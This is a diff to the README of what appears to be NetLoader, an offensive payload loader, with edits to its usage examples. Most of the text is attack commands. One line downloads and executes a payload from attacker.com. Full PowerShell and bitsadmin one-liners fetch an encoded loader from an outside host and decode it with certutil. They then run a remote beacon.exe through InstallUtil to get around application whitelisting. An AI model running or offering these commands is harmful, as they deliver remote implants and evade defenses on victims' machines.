@@ -40,7 +40,7 @@ Basic Examples:
 NetLoader.exe /path=C:\tools\payload.exe
 
 # Download and execute from URL
-InstallUtil.exe /path=http://attacker.com/payload.exe
+NetLoader.exe /path=http://attacker.com/payload.exe
 
 # With arguments for payload
 NetLoader.exe /path=payload.exe /args="arg1,arg2,arg3"
@@ -96,11 +96,11 @@ Certutil -encode NL-mod.exe nl.enc
 
 Finally executed with
 ```powershell
-powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\vns.exe
+powershell rm C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\nl.exe; powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\nl.enc; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\nl.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\nl.exe
 ```
 Or with `bitsadmin`
 ```powershell
-bitsadmin /Transfer myJob http://192.168.235.130:8000/Tools/NetLoader/nl.enc C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\vns.exe
+powershell rm C:\\windows\\Tasks\\nl.enc; powershell rm C:\\windows\\Tasks\\nl.exe; bitsadmin /Transfer myJob http://192.168.235.130:8000/Tools/NetLoader/nl.enc C:\\windows\\Tasks\\nl.enc; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\nl.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /path=http://192.168.235.130:8000/beacon.exe /U C:\\windows\\Tasks\\nl.exe
 ```
 > [!NOTE]
 > For `x86` use `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`.
